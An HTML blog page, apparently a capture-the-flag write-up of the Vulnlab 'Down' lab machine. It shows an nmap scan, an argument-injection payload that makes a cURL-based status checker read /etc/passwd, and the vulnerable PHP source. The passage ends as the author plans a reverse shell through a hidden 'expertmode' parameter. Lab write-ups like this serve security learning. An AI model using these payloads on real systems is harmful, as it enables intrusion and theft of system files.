@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Muyi">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/01/28/vulnlab/vulnlab-down/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/elmo-launch.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/elmo-launch.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/elmo-launch.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Vulnlab-Down | Muyi&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":5,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":false,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Blog for storing the knowledges I need (;","subtitle":{"text":["sudo echo \"subtitle goes here\""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/1/22 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Muyi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">37</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			
+			
+			<img src="https://assets.vulnlab.com/down_slide.png" alt="Vulnlab-Down" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75" />
+			
+			<div class="w-full flex items-center absolute bottom-0 justify-start">
+				<h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-semibold backdrop-blur-lg rounded-xl border border-border-color ">Vulnlab-Down</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/elmo.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Muyi</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-01-28 13:53:55</span>
+        <span class="mobile">2025-01-28 13:53:55</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-01-28 15:26:05</span>
+            <span class="mobile">2025-01-28 15:26:05</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Linux/">Linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Vulnlab/">Vulnlab</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Easy/">Easy</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>simple nmap scan</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>nmap</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 19:43 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.120.182</span><br><span class="line">Host is up (0.31s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 22.62 seconds</span><br></pre></td></tr></table></figure></div>
+<p>On <code>port 80</code>, the website shows a page with status checking function which seems to be using <code>cURL</code>.<br><br></p>
+<p>By providing the URL link towards my python server, it reaches out to it.<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnlab-down/first-encounter.png"
+                      alt="testing-the-website"
+                ></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>simple server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ serv</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.120.182 - - [25/Jan/2025 19:46:45] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure></div>
+<br>
+
+<p>Curling for localhost also works<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnlab-down/localhost.png"
+                      alt="localhost"
+                ></p>
+<hr>
+
+<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>From <code>Unix &amp; Linux</code> (<a class="link"   target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/648144/how-to-use-curl-to-get-a-file-from-a-specific-directory" >https://unix.stackexchange.com/questions/648144/how-to-use-curl-to-get-a-file-from-a-specific-directory<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>), learn that <code>cURL</code> can be used to read specific files via <code>curl file:///etc/passwd</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>curl</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#demo</span></span><br><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ curl file:///etc/passwd | grep muyi</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  3615  100  3615    0     0  11.5M      0 --:--:-- --:--:-- --:--:-- 3530k</span><br><span class="line">muyi:x:1000:1000:,,,:/home/muyi:/bin/bash</span><br></pre></td></tr></table></figure></div>
+
+<p>Expanding the command so that it contains <code>http/https</code> as per requested by the website, it will look like this</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>cURL for http + etc/passwd</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># demo</span></span><br><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ curl http://10.8.5.50:8000 file:///etc/passwd</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Directory listing <span class="keyword">for</span> /&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Directory listing <span class="keyword">for</span> /&lt;/h1&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">... web content goes here ...</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">... more to go ...</span><br><span class="line">muyi:x:1000:1000:,,,:/home/muyi:/bin/bash</span><br><span class="line">... more to go ...</span><br></pre></td></tr></table></figure></div>
+<br>
+
+<p>using this concept, exploit the website.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Down~10.10.120.182$ curl -X <span class="string">&#x27;POST&#x27;</span> <span class="string">&quot;http://<span class="variable">$ip</span>&quot;</span> -d <span class="string">&quot;url=http://127.0.0.1+file:///etc/passwd&quot;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Is it down or just me?&lt;/title&gt;</span><br><span class="line">    &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">... <span class="built_in">source</span> of web page ...</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">... more <span class="keyword">in</span> between ...</span><br><span class="line"></span><br><span class="line">aleks:x:1000:1000:Aleks:/home/aleks:/bin/bash</span><br><span class="line">lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">... more below ...</span><br></pre></td></tr></table></figure></div>
+<p>notice there’s user <code>aleks</code>, this can be useful onwards</p>
+<p>After enumerating quite a files, reviewing back the <code>index.php</code> for the php code</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ( isset($_GET[&#x27;expertmode&#x27;]) &amp;&amp; $_GET[&#x27;expertmode&#x27;] === &#x27;tcp&#x27; ) &#123;</span><br><span class="line">  echo &#x27;&lt;h1&gt;Is the port refused, or is it just you?&lt;/h1&gt;</span><br><span class="line">        &lt;form id=&quot;urlForm&quot; action=&quot;index.php?expertmode=tcp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; id=&quot;url&quot; name=&quot;ip&quot; placeholder=&quot;Please enter an IP.&quot; required&gt;&lt;br&gt;</span><br><span class="line">            &lt;input type=&quot;number&quot; id=&quot;port&quot; name=&quot;port&quot; placeholder=&quot;Please enter a port number.&quot; required&gt;&lt;br&gt;</span><br><span class="line">            &lt;button type=&quot;submit&quot;&gt;Is it refused?&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &#x27;&lt;h1&gt;Is that website down, or is it just you?&lt;/h1&gt;</span><br><span class="line">        &lt;form id=&quot;urlForm&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;url&quot; id=&quot;url&quot; name=&quot;url&quot; placeholder=&quot;Please enter a URL.&quot; required&gt;&lt;br&gt;</span><br><span class="line">            &lt;button type=&quot;submit&quot;&gt;Is it down?&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( isset($_GET[&#x27;expertmode&#x27;]) &amp;&amp; $_GET[&#x27;expertmode&#x27;] === &#x27;tcp&#x27; &amp;&amp; isset($_POST[&#x27;ip&#x27;]) &amp;&amp; isset($_POST[&#x27;port&#x27;]) ) &#123;</span><br><span class="line">  $ip = trim($_POST[&#x27;ip&#x27;]);</span><br><span class="line">  $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);</span><br><span class="line">  $port = trim($_POST[&#x27;port&#x27;]);</span><br><span class="line">  $port_int = intval($port);</span><br><span class="line">  $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);</span><br><span class="line">  if ( $valid_ip &amp;&amp; $valid_port ) &#123;</span><br><span class="line">    $rc = 255; $output = &#x27;&#x27;;</span><br><span class="line">    $ec = escapeshellcmd(&quot;/usr/bin/nc -vz $ip $port&quot;);</span><br><span class="line">    exec($ec . &quot; 2&gt;&amp;1&quot;,$output,$rc);</span><br><span class="line">    echo &#x27;&lt;div class=&quot;output&quot; id=&quot;outputSection&quot;&gt;&#x27;;</span><br><span class="line">    if ( $rc === 0 ) &#123;</span><br><span class="line">      echo &quot;&lt;font size=+1&gt;It is up. It&#x27;s just you! 😝&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">      echo &#x27;&lt;p id=&quot;outputDetails&quot;&gt;&lt;pre&gt;&#x27;.htmlspecialchars(implode(&quot;\n&quot;,$output)).&#x27;&lt;/pre&gt;&lt;/p&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;&lt;font size=+1&gt;It is down for everyone! 😔&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">      echo &#x27;&lt;p id=&quot;outputDetails&quot;&gt;&lt;pre&gt;&#x27;.htmlspecialchars(implode(&quot;\n&quot;,$output)).&#x27;&lt;/pre&gt;&lt;/p&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &#x27;&lt;div class=&quot;output&quot; id=&quot;outputSection&quot;&gt;&#x27;;</span><br><span class="line">    echo &#x27;&lt;font color=red size=+1&gt;Please specify a correct IP and a port between 1 and 65535.&lt;/font&gt;&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; elseif (isset($_POST[&#x27;url&#x27;])) &#123;</span><br><span class="line">  $url = trim($_POST[&#x27;url&#x27;]);</span><br><span class="line">  if ( preg_match(&#x27;|^https?://|&#x27;,$url) ) &#123;</span><br><span class="line">    $rc = 255; $output = &#x27;&#x27;;</span><br><span class="line">    $ec = escapeshellcmd(&quot;/usr/bin/curl -s $url&quot;);</span><br><span class="line">    exec($ec . &quot; 2&gt;&amp;1&quot;,$output,$rc);</span><br><span class="line">    echo &#x27;&lt;div class=&quot;output&quot; id=&quot;outputSection&quot;&gt;&#x27;;</span><br><span class="line">    if ( $rc === 0 ) &#123;</span><br><span class="line">      echo &quot;&lt;font size=+1&gt;It is up. It&#x27;s just you! 😝&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">      echo &#x27;&lt;p id=&quot;outputDetails&quot;&gt;&lt;pre&gt;&#x27;.htmlspecialchars(implode(&quot;\n&quot;,$output)).&#x27;&lt;/pre&gt;&lt;/p&gt;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;&lt;font size=+1&gt;It is down for everyone! 😔&lt;/font&gt;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &#x27;&lt;div class=&quot;output&quot; id=&quot;outputSection&quot;&gt;&#x27;;</span><br><span class="line">    echo &#x27;&lt;font color=red size=+1&gt;Only protocols http or https allowed.&lt;/font&gt;&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+<p>From the output above, notice there is a hidden function known as <code>expertmode</code> which uses <code>tcp</code>, possibility in gaining reverse shell. Try to exploit it.</p>
+<ol>
+<li>set index.php to index.php?expertmode&#x3D;tcp</li>
+<li>required IP and port number</li>
+<li>setting up a listener</li>
+</ol>
